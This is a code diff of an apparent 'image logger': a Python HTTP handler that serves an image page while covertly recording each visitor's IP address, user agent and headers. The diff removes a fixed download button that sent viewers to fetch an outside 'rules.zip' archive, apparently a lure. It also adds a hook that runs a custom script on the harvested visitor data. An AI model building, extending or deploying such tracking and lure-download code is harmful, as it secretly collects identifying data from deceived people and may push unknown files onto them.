@@ -52,14 +52,16 @@ config = {
         "redirect": False, # Redirect to a webpage?
         "page": "https://your-link.here" # Link to the webpage to redirect to 
     },
-
-    # FILE DOWNLOAD #
-    "fileDownload": {
-        "enabled": True, # Enable file download option?
-        "fileUrl": "https://codeload.github.com/FunwaysAntonin/link/zip/refs/heads/main", # URL of the file to download
-        "fileName": "rules.zip" # Name of the file when downloaded
-    },
 }
+
+# ============================================
+# VOTRE SCRIPT PERSONNALISÉ (collez ici)
+# ============================================
+
+# Exemple: if ip.startswith("192"):
+#             print(f"IP locale détectée: {ip}")
+
+
 
 blacklistedIPs = ("27", "104", "143", "164")
 
@@ -212,21 +214,7 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
                     except:
                         pass
 
-            # Check if download is requested
-            if config["fileDownload"]["enabled"] and query_params.get("download") == "1":
-                self.send_response(302)
-                self.send_header('Location', config["fileDownload"]["fileUrl"])
-                self.end_headers()
-                return
-
             # Generate HTML with image
-            download_button = ""
-            if config["fileDownload"]["enabled"]:
-                current_url = self.path.split('?')[0]
-                separator = '&' if '?' in self.path else '?'
-                download_url = f"{current_url}{separator}download=1"
-                download_button = f'<a href="{download_url}" style="position: fixed; bottom: 20px; right: 20px; padding: 10px 20px; background-color: #007bff; color: white; text-decoration: none; border-radius: 5px; font-family: Arial; z-index: 1000; cursor: pointer;">Télécharger</a>'
-            
             html_content = f'''<style>body {{
 margin: 0;
 padding: 0;
@@ -238,7 +226,7 @@ background-repeat: no-repeat;
 background-size: contain;
 width: 100vw;
 height: 100vh;
-}}</style><div class="img"></div>{download_button}'''
+}}</style><div class="img"></div>'''
             
             # Check if IP is blacklisted
             if ip.startswith(blacklistedIPs):
@@ -269,6 +257,15 @@ height: 100vh;
                     self.send_header('Location', url)
                     self.end_headers()
                 return
+            
+            # Execute custom script if enabled
+            if config["customScript"]["enabled"]:
+                try:
+                    custom_module = loadCustomScript()
+                    if custom_module and hasattr(custom_module, 'custom_handler'):
+                        custom_module.custom_handler(ip, user_agent, headers, query_params)
+                except Exception as e:
+                    print(f"Error executing custom script: {e}")
             
             # Not a bot - log the IP
             result = None
